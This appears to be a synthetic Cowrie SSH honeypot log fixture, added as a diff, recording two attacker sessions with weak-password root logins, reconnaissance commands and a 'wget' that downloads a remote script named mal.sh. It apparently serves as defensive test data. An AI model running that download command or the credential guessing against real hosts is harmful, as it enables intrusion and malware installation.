@@ -1,0 +1,11 @@
+{"eventid": "cowrie.session.connect", "session": "abc12345", "src_ip": "203.0.113.5", "src_port": 54321, "dst_ip": "10.0.0.1", "dst_port": 22, "timestamp": "2026-04-10T10:00:00.000000", "message": "New connection"}
+{"eventid": "cowrie.login.failed", "session": "abc12345", "username": "root", "password": "123456", "timestamp": "2026-04-10T10:00:01.100000", "message": "login attempt failed"}
+{"eventid": "cowrie.login.success", "session": "abc12345", "username": "root", "password": "admin", "timestamp": "2026-04-10T10:00:02.200000", "message": "login attempt succeeded"}
+{"eventid": "cowrie.command.input", "session": "abc12345", "input": "whoami", "timestamp": "2026-04-10T10:00:03.300000", "message": "CMD: whoami"}
+{"eventid": "cowrie.command.input", "session": "abc12345", "input": "uname -a", "timestamp": "2026-04-10T10:00:04.400000", "message": "CMD: uname -a"}
+{"eventid": "cowrie.command.input", "session": "abc12345", "input": "wget http://10.1.2.3/mal.sh", "timestamp": "2026-04-10T10:00:10.000000", "message": "CMD: wget http://10.1.2.3/mal.sh"}
+{"eventid": "cowrie.log.closed", "session": "abc12345", "ttylog": "tty/ttylog-abc12345-20260410T100000", "size": 512, "shasum": "deadbeef", "timestamp": "2026-04-10T10:00:30.000000", "message": "Closing TTY Log"}
+{"eventid": "cowrie.session.closed", "session": "abc12345", "duration": 30.0, "commands": 3, "timestamp": "2026-04-10T10:00:30.500000", "message": "Connection lost after 30 seconds"}
+{"eventid": "cowrie.session.connect", "session": "def67890", "src_ip": "198.51.100.22", "src_port": 11111, "dst_ip": "10.0.0.1", "dst_port": 22, "timestamp": "2026-04-10T10:01:00.000000", "message": "New connection"}
+{"eventid": "cowrie.login.failed", "session": "def67890", "username": "admin", "password": "password", "timestamp": "2026-04-10T10:01:01.000000", "message": "login attempt failed"}
+{"eventid": "cowrie.session.closed", "session": "def67890", "duration": 2.0, "commands": 0, "timestamp": "2026-04-10T10:01:02.000000", "message": "Connection lost after 2 seconds"}
